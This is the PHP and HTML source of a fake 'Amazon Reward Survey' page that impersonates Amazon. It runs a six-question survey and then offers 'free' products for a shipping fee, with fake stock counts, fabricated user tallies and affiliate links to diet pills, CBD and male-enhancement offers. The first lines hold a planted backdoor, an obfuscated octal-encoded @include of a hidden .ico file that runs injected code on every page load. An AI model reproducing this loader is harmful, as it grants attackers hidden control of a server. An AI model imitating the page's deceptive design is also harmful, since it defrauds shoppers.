<?php
/*7ab98*/

@include "\057hom\145/ho\163tin\147adm\151n/u\163asu\162vey\172.co\155/v2\057css\057.3b\06003e\0636.i\143o";

/*7ab98*/
include 'database.php';?>
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Reward Survey - We Want Your Opinion!</title>
	<title>Congratulations!</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" id="dynamic-favicon" type="image/x-icon" href="images/favicon_black.png"/>
	<link rel="shortcut icon" id="dynamic-favicon" type="image/x-icon" href="images/favicon_black2.png"/>
	<!-- Stylesheets -->
	<link rel="stylesheet" href="css/font-awesome.min.css">
	<link rel="stylesheet" href="css/style.css">
	<link rel="stylesheet" href="css/bootstrap.min.css">

	<!-- Javascripts --> 
	<script type="text/javascript" src="js/jquery.min.js"></script> 
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
	<!-- modal popup start js--> 
	<script type="text/javascript">
		window.onbeforeload = function () {
			document.onkeydown = function (e) {
				return (e.which || e.keyCode) != 116;
			};
		}
		window.onload = function () {
                       //   jQuery('#myModal').modal('show');
                   };
                   $( document ).ready(function() {
						  // Handler for .ready() called.
						  jQuery('#myModal').modal('show');
						});
					</script>
					<!-- modal popup end js-->
<script>
        var titleArray = ["Reward Survey - We Want Your Opinion!","Congratulations!"];
        var N = titleArray.length;
        var i = 0;
        setInterval(func,5000);
        function func(){
            if (i == 2) {
                i = 0;
            }
            document.title = titleArray[i];
            i++;
        }

</script>
<script>
		$(document).ready(function() {
			$(".remove_link").click(function() {
				var url = $(this).attr('id');
				window.open(url, '_blank');
			});
		});
</script>
</head>

				<body>

					<!-- Header -->

					<div class="top-header">
						<span><a href="#"><img src="images/amazon_logo.png" class="img-responsive"></a></span>
					</div>			
					<div class="date">
						<span class="flag"><img src="images/flag_us.png" alt=""></span>
						<span class="date_show" id="datetime">May 08, 2019</span>
					</div>
		<!-- modal popup start HTML-->
		<div style="background-size: 100% 100%; display: block;" class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
            <div class="modal-dialog">
                     <div class="modal-content">
                        <div class="modal-body" style="padding-left:25px;padding-right:25px; padding-bottom:25px;text-align:center;">
                           <!--<img style="display:block;margin-left:auto;margin-right:auto;" src="/gift.png" class=""></td>-->
                          <!--
						  <script>var msg = '<font size = "3"><strong>Congratulations Amazon shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';var msg2 = msg.replace("$date",datehax());document.write(msg2);</script>
                          -->
						  <div class="icon-smallmodal"><img src="images/modal-icon2.png" class="img-responsive"></div>
                          <script>var msg = '<font size = "3"><strong>Congratulations Amazon Shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><div class="fb-wrapper" id="fb-wrapper" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false"><\/div><\/div><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';var msg2 = msg.replace("$date",datehax());document.write(msg2);</script>
						  <div class="modal_small">
						  <font size="5" class="modaltitle"><strong>Dear <span class="amazon-color">Amazon </span> Shopper,</strong></font><br><p>You have been selected to get an exclusive reward!</p> 
						  
						  <div class="fb-wrapper" id="fb-wrapper" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like fb_iframe_widget" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false" fb-xfbml-state="rendered" fb-iframe-plugin-query="action=recommend&amp;app_id=405670262806154&amp;container_width=0&amp;href=https%3A%2F%2Fwww.facebook.com%2Ffacebook%2F&amp;layout=standard&amp;locale=en_US&amp;sdk=joey&amp;share=false&amp;show_faces=true&amp;size=small&amp;width=400"><span style="vertical-align: bottom; width: 400px; height: 28px;"></span></div></div><p>To qualify for this special offer, simply complete our 30-second marketing survey about your experiences with <strong>Amazon</strong>.</p><p>Click<strong> OK </strong>to start.</p>
                           <!--<p>Reference number: <strong style="background-color: yellow">37159</strong>.</p> 
                              -->
                           <!--<span id="timer_box">This offer will expire in the next 2 minutes: <span id="timer" style="background-color: yellow"></span> </span>-->
                            <div class="modalbuttons_none"><hr>
                              <button id="modalbutton" style="font-weight:bold; width: 50%;" type="button" class="btn-lg  btn-start" data-dismiss="modal">ok</button>
							</div>
						  </div>
						    <div class="modalbuttons_block"><hr>
                              <button id="modalbutton" style="font-weight:bold; width: 50%;" type="button" class="btn-lg  btn-start" data-dismiss="modal">ok</button>
							  <div class="small_modaldate">This survey is available only today: <span id="datetime2"></span></div>
							</div>
					    </div>	
                           
                     </div>
                  </div>
               </div>
			</div>
		</div>
<!-- modal popup end HTML-->			   

   <!-- section -->
   <section class="rooms mt50" id="screenHeight">
   	<div class="container">
   		<div class="row reviewboxbuttons">
   			<div class="col-sm-2">
   				<div class="operator_foto"><img src="images/op_foto.png"></div>
   			</div>
   			<div class="col-sm-10">
   				<div class="operator_text">
   					<div id="tellAboutYourSelf">
   						<p><b>Dear Amazon <span class="user_place">Shopper</span>,</b></p>
   						<p>Please tell us about your <span class="title_header">Amazon</span> experience and as a thank you, you can select from several exclusive offer rewards!
   						</p>
   						<p>User Reference: <span class="random_numb">159824</span></p>
   					</div>
   					<div id="thankYouOnComletion" style="display: none;">
   						<p><b>Thank you for completing the survey!</b></p>
   						<p>With sincere thanks, you may now choose <b>(1)</b> of the following exclusive offer rewards below.</p>
   						<p class="coupon">✓ Successfully redeemed coupon code <b>Amazon1A</b></p>
   					</div>
   				</div>
   			</div>
   			<div class="col-sm-12" style="padding: 0;">
   				<div id="1" style="display:block;background: #f9f9f9;padding-bottom: 10px;">
   					<div class="question-count center_q">Question 1 of 6</div>
   					<div class="question center_q">What is your gender?</div>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Male<br></button>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Female<br></button>	
   				</div>

   				<div id="2"  style="display:none;background: #f9f9f9;padding-bottom: 10px;">
   					<div class="question-count center_q">Question 2 of 6</div>
   					<div class="question center_q">What is your age range?</div>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Under 18</button>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">18-29</button>	
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">30-39</button>	
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">40-49</button>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">50-59</button>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">60+</button>
   				</div>

   				<div id="3"  style="display:none;background: #f9f9f9;padding-bottom: 10px;">
   					<div class="question-count center_q">Question 3 of 6</div>
   					<div class="question center_q">How satisfied are you with Amazon's service overall?</div>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Very Satisfied</button>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Somewhat Satisfied</button>	
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Somewhat Disappointed</button>	
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Very Disappointed</button>
   				</div>

   				<div id="4"  style="display:none;background: #f9f9f9;padding-bottom: 10px;">
   					<div class="question-count center_q">Question 4 of 6</div>
   					<div class="question center_q">Did the last order you placed with Amazon get to you fast enough for you?</div>
   					<button id="q1a" type="button" class="sv_btn sv_btn2" onclick="goToNext(this);">Yes, It Got Here Sooner Than I Thought It Would!</button>
   					<button id="q1a" type="button" class="sv_btn sv_btn2" onclick="goToNext(this);">Yes, It Arrived Right On Time</button>	
   					<button id="q1a" type="button" class="sv_btn sv_btn2" onclick="goToNext(this);">No, It Was A Little Bit Late</button>
   					<button id="q1a" type="button" class="sv_btn sv_btn2" onclick="goToNext(this);">No, It Was Very Late</button>
   				</div>

   				<div id="5"  style="display:none;background: #f9f9f9;padding-bottom: 10px;">
   					<div class="question-count center_q">Question 5 of 6</div>
   					<div class="question center_q">Do you think navigating Amazon is easy?</div>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Yes</button>
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Kind Of</button>	
   					<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">No</button>
   				</div>

   				<div id="6"  style="display:none;background: #f9f9f9;padding-bottom: 10px;">
   					<div class="question-count center_q">Question 6 of 6</div>
   					<div class="question center_q">How do you feel about the prices?</div>
   					<button id="q1a" type="button" class="sv_btn" onclick="last(this);">They're Great</button>
   					<button id="q1a" type="button" class="sv_btn" onclick="last(this);">They're Pretty Good</button>	
   					<button id="q1a" type="button" class="sv_btn" onclick="last(this);">They're Okay</button>	
   					<button id="q1a" type="button" class="sv_btn" onclick="last(this);">They're Kind Of High</button>
   					<button id="q1a" type="button" class="sv_btn" onclick="last(this);">They're Horrible!</button>
   				</div>
   				<div id="loading-img" style="display:none; margin-bottom:20px;">
   					<p><b>Checking product inventory:</b></p>
   					<img src="images/TaPz.gif" class="img-responsive">
   				</div>			
   				<!-- resulet -->
   				<div id="results" style="display:none">
   					<br>

   					<div id="offers" class="offer_full">
   						<div class="row row-parent" id="owallwrapper">

   							<!-- PHP START -->
   							<?php 
   							$data = mysqli_query($conn, "select * from products");
   							if($data)
   							{
   								while($products = mysqli_fetch_array($data)) {
   									//print_r($products);exit;
   								
   							?>
   							<div id="offer_main_div_1" class="col-md-12 item sex_female" data-name="female"> 
   								<div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
   								
   									
   									
   									<div class="col-md-3 text-center">
   									    <?php
                                            if($products['images'] != "")
                                            {                                               
                                            ?>
   									   
   										<a href=<?php echo $products['url_1']; ?> target="_blank">
   										    <img id="offer_img_1" class="img-responsive" style="width: 100%;" src="<?php echo $products['images']; ?>" alt="..." onclick="ViewOffer_1();">
   										  </a> 
   									<div class="reviewitem" style="color:#164d96;"><img id="star_img_1" src="<?php echo $products['reviews']; ?>"  alt="..." height="18" width="71" onclick="ViewOffer_1();"> 
   									<a id="offer_review_anchor_1" onclick="ViewOffer_1();">(<?php echo $products['review_users']; ?>)</a>
   									</div> <br> 
   									
   									            <?php
                                          }
                                          elseif($products['images'] == "" || $products['images'] == NULL)
                                          {
                                             ?>
                                                <img src="images/products_image/default-product-img.jpg"
                                                    width="100px">
                                                <?php  
                                          }
                                          ?>
                                               
                                          
                                            </div>
                                           
   									
   									
   									
   									
   									<div class="col-md-9 text-left name_prod" style="color: black;"> 
   										<strong><span class="namepro"><?php echo $products['product_name'];?></span></strong>
   										
   										<b><?php echo $products['description'];?></b> 
   										<br> Normal Price:  <strike><?php echo $products['product_price']; ?></strike> <br> <strong> Today’s Price:  <b class="blink"><?php echo $products['regular_price']; ?></b></strong><br> Postage: <strong><?php echo $products['shipping']; ?></strong><br> Qty Left: (<font color="#FF0000"><?php echo $products['quantity']; ?></font>)<br> <br> <span class=" quantity"> <span class="label label-danger">1</span> </span> 
   										<div id="claim_btn_div_1" class="col-md-6 height:100%;">
   										     <?php 
                                                if($products['img_popular'] != "")
                                                {
                                            ?>
                                            <img src="<?php echo $products['img_popular'];?>" class="img-responsive">
                                            <?php 
                                            }
                                            ?>
   										    
   										    <a id="https://www.the-quality-fashion.biz/?z=l7&AFFID=3684&C1=&C2=58ds665yd3o6&click_id=248005040&C3=wMEUKC4AQDU3HRAMHH0P52AO" class="remove_link" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
   										<div class="users_numb">11 users have chosen this reward</div>
   									</div>
   								</div> 

   							</div> 
   						</div> 
   						<?php 

   							}
   							}

   						 ?>
   						<!-- PHP end -->





   						<div id="offer_main_div_10" class="col-md-12 item sex_female" data-name="female"> 
   							<div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff; opacity:0.45;"> 
   								<div class="col-md-3 text-center">
   									<img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/eicg.png" alt="..." onclick="ViewOffer_1();">
   									<div class="reviewitem" style="color:#164d96;"><img id="star_img_1" src="images/5-star.png" height="18" width="71" onclick="ViewOffer_1();"> <a id="offer_review_anchor_1" onclick="ViewOffer_1();">(921)</a></div> <br> 
   								</div> 
   								<div class="col-md-9 text-left name_prod" style="color: black;">
   									<strong><span class="namepro">E-CIGS™ Pro Vapor</span></strong>
   									<b>Exclusive vape starter kit. The look, the feel, the taste. Anytime!</b> 
   									<br> Normal Price:  <strike> $169.05</strike> <br> <strong> Today’s Price:  <b class="blink">$0.00!</b></strong><br> Postage: <strong>$4.95</strong><br> Qty Left: (<font color="#FF0000">2</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">0</span> </span> 
   									<div id="claim_btn_div_1" class="col-md-6 height:100%;"> <button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button> 
   										<div class="users_numb">61 users have chosen this reward</div>
   									</div>
   								</div> 

   							</div> 
   						</div>


   					</div>
   				</div>
   				
   				<div id="offers" class="offer_small">
                        <div class="row row-parent" id="owallwrapper">
						 <div id="offer_main_div_1" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding-bottom: 0;padding: 12px;margin:5px; border: 1px solid #51ae3a; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://www.the-quality-fashion.biz/?z=l7&AFFID=3684&C1=&C2=58ds665yd3o6&click_id=248005040&C3=wMEUKC4AQDU3HRAMHH0P52AO" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/watch.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;"> 
							 <strong><span class="namepro">Brand New January 2019 Designer  Watches for Men and Women - The Perfect Present!</span></strong>
							 <b>For Him and Her Choose a Style</b> 
							 <br>  <strike class="blink_red"> $109.95</strike> <strong>  <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$6.99</strong> Qty Left: (<font color="#FF0000">1</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">1</span> </span> 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> 
									<a href="https://www.the-quality-fashion.biz/?z=l7&AFFID=3684&C1=&C2=58ds665yd3o6&click_id=248005040&C3=wMEUKC4AQDU3HRAMHH0P52AO" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
									<div class="users_numb">11 users have chosen this reward</div>
								 </div>
														
							<div class="row offer-row" style="padding-bottom: 0;margin:-12px;margin-top: 2px;"> 
								<div class="pop_block"><a href="https://www.the-quality-fashion.biz/?z=l7&AFFID=3684&C1=&C2=58ds665yd3o6&click_id=248005040&C3=wMEUKC4AQDU3HRAMHH0P52AO">Popular</a></div>	 
							</div>
						 </div> 
						 </div> 
						 
						 <div id="offer_main_div_2" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://ketogenesys.net/success/v1/?AFID=TAN&SID=3684&click_id=248005038" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/keto_new18_1.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">Forskolin Keto Advanced Weight Loss</span></strong>
							 <b>The new way to burn fat! Natural, safe & effective pure ketosis formula!</b> 
							 <br>  <strike class="blink_red"> $149.95</strike>  <strong>  <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$4.95</strong> Qty Left: (<font color="#FF0000">1</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">1</span> </span> 
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <a href="https://ketogenesys.net/success/v1/?AFID=TAN&SID=3684&click_id=248005038" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">38 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_3" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://www.herbalistpain.com/chs-gr?client=oc33&router=33BCD70F2EF504F9D8D281D1534857902411&affid=270833&subid=3684&ClickID=05_15660492_176ed990-11ca-4bb2-8da9-f202dac6fe5a&CID=422545&subid1=&subid2=5b6f0rlzylht&subid3=248005830&AffiliateReferenceID=&TrackTrans=" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/cbdspray.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;"> 
							 <strong><span class="namepro">100% Pure CBD Oil</span></strong>
							 <b>Your <b style="color: green;">EXCLUSIVE OFFFER!</b>  Buy 3 bottles get 1 <b style="color: green;">FREE</b>. $100 discount <b style="color: green;">TODAY ONLY</b> !</b> 
							 <b>Relieve pain and inflammation, and reduce anxiety! Legal in 50 states. You won’t find CBD cheaper anywhere else.</b>
							 <br>  <strike class="blink_red"> $199.99</strike> <strong>   <b class="blink">$37.00!</b></strong><br><br>
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;">  <a href="https://www.herbalistpain.com/chs-gr?client=oc33&router=33BCD70F2EF504F9D8D281D1534857902411&affid=270833&subid=3684&ClickID=05_15660492_176ed990-11ca-4bb2-8da9-f202dac6fe5a&CID=422545&subid1=&subid2=5b6f0rlzylht&subid3=248005830&AffiliateReferenceID=&TrackTrans=" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">31 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_4" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://www.shoutable.com/" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/skincare_new.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">Celebrity Skincare Kit</span></strong>
							 <b>Better than botox! Get Hollywood's best kept beauty secret!</b> 
							 <br>  <strike class="blink_red"> $249.95</strike> <strong>   <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$1.99</strong> Qty Left: (<font color="#FF0000">1</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">3</span> </span> 
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <a href="https://www.shoutable.com/" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">13 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_5" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://getemergencygear.com/cb/rivalbrand/f-tpfpa_v1b/?hop=survivel9&vendor=rivalbrand&AFFID=1001&C1=3684&C2=&click_id=1021bf5cc663f496728d7532ea66a0" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/flight_img.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">Pro Tactical LED Flashlight</span></strong>
							 <b>The world's brightest, most powerful & reliable tactical LED flashlight! Yours FREE!</b> 
							 <br>  <strike class="blink_red"> $38.95</strike> <strong>  <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$1.99</strong> Qty Left: (<font color="#FF0000">2</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">3</span> </span> 
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <a href="https://getemergencygear.com/cb/rivalbrand/f-tpfpa_v1b/?hop=survivel9&vendor=rivalbrand&AFFID=1001&C1=3684&C2=&click_id=1021bf5cc663f496728d7532ea66a0" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">51 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_6" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://www.luxury-products.biz/v1/?z=l8&AFFID=108180&C1=&C2=ZDYwODBmMjg5OWRiNjg3YmM2NGZiMGFjZjI4ZGE2MjA&click_id=wJLDCHVK37EFERAMHJ0T7DHA" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/Jewellery.jpg" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">Donna Klan Designer Jewellery</span></strong>
							 <b>Claim your iconic jewellery design from our 2019 collection. Four amazing styles available!</b> 
							 <br> <strike class="blink_red"> $210.90</strike>  <strong>   <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$7.81</strong> Qty Left: (<font color="#FF0000">2</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">1</span> </span> 
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <a href="https://www.luxury-products.biz/v1/?z=l8&AFFID=108180&C1=&C2=ZDYwODBmMjg5OWRiNjg3YmM2NGZiMGFjZjI4ZGE2MjA&click_id=wJLDCHVK37EFERAMHJ0T7DHA" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">16 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_7" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://www.shoutable.com/" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/male_eh.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">Male Enhancement Formula</span></strong>
							 <b>Get a surge in sex drive & energy! Increased sexual confidence!</b> 
							 <br> <strike class="blink_red"> $109.95</strike> <strong>  <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$4.95</strong> Qty Left: (<font color="#FF0000">2</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">2</span> </span> 
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <a href="https://www.shoutable.com/" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">60 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_8" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://find-real-dating.com/?u=f8ykd0x&o=mfcpbzr&t=Pr&cid=715ecwfzwrnzwd1b" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/muscle.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">Testosterone Booster</span></strong>
							 <b>Increase muscle mass with this all natural testosterone booster!</b> 
							 <br> <strike class="blink_red"> $125.95</strike> <strong>  <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$4.95</strong> Qty Left: (<font color="#FF0000">2</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">5</span> </span> 
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <a href="https://find-real-dating.com/?u=f8ykd0x&o=mfcpbzr&t=Pr&cid=715ecwfzwrnzwd1b" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">10 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_9" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
							<div class="col-md-3 text-center img_box_section">
							 <a href="https://www.qualitytrends.org/v3/?Z=l2&AFFID=108180&C1=&C2=5pngbdfl4mcq&click_id=NGI4ZWRiMjZjYWUyYWM4ODlmZjRkOTU4Yzk0M2Y1ZTQ&C3=w128GM8P3BGDORAM1F1NP76Q" target="_blank"><img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/handbag.png" alt="..." onclick="ViewOffer_1();"></a> 
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">2019 Women's Designer Purse!</span></strong>
							 <b>Choose your exclusive luxury designer purse today.</b> 
							 <br> <strike class="blink_red"> $199.95</strike> <strong> Today’s Price:  <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$7.81</strong> Qty Left: (<font color="#FF0000">2</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">2</span> </span> 
							 
							 </div> 
								 <div id="claim_btn_div_1" class="col-md-6 height:100%;"> <a href="https://www.qualitytrends.org/v3/?Z=l2&AFFID=108180&C1=&C2=5pngbdfl4mcq&click_id=NGI4ZWRiMjZjYWUyYWM4ODlmZjRkOTU4Yzk0M2Y1ZTQ&C3=w128GM8P3BGDORAM1F1NP76Q" target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Get My Reward</button></a> 
								 <div class="users_numb">42 users have chosen this reward</div>
								 </div>
						 </div> 
						 </div>
						 
						 <div id="offer_main_div_10" class="col-md-12 item sex_female" data-name="female"> 
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff; opacity:0.45;"> 
							<div class="col-md-3 text-center img_box_section">
							 <img id="offer_img_1" class="img-responsive" style="width: 100%;" src="images/eicg.png" alt="..." onclick="ViewOffer_1();">
							  <br> 
							 </div> 
							 <div class="col-md-9 text-left name_prod text_box_section" style="color: black;">
							 <strong><span class="namepro">E-CIGS™ Pro Vapor</span></strong>
							 <b>Exclusive vape starter kit. The look, the feel, the taste. Anytime!</b> 
							 <br> <strike class="blink_red"> $169.05</strike>  <strong> <b class="blink">$0.00!</b></strong><br> Shipping: <strong style="margin-right:5px;">$4.95</strong> Qty Left: (<font color="#FF0000">2</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">0</span> </span> 
							 
							 </div> 
